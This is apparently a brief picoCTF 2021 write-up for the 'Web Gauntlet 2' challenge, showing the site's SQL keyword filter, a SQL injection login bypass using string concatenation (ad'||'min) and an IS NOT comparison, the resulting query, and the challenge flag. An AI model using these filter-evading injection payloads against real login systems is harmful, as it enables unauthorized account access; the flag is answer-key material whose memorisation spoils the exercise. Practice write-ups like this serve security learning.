# Web Gauntlet 2

```markdown
Tags: `picoCTF2021` `Web Exploitation`
```

## **Description**

This website looks familiar... Log in as admin Site: [http://mercury.picoctf.net:65261/](http://mercury.picoctf.net:65261/) Filter: [http://mercury.picoctf.net:65261/filter.php](http://mercury.picoctf.net:65261/filter.php)

<figure><img src="../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>

The filter of this round: or and true false union like = > < ; -- /\* \*/ admin

```sql
Username: ad'||'min
password: 1' IS NOT '2
```

```sql
SELECT username, password FROM users WHERE username='ad'||'min' AND password='1' IS NOT '2' 
```

## Flag

<figure><img src="../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (30) (1).png" alt=""><figcaption><p><code>picoCTF{0n3_m0r3_t1m3_e2db86ae880862ad471aa4c93343b2bf}</code></p></figcaption></figure>

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
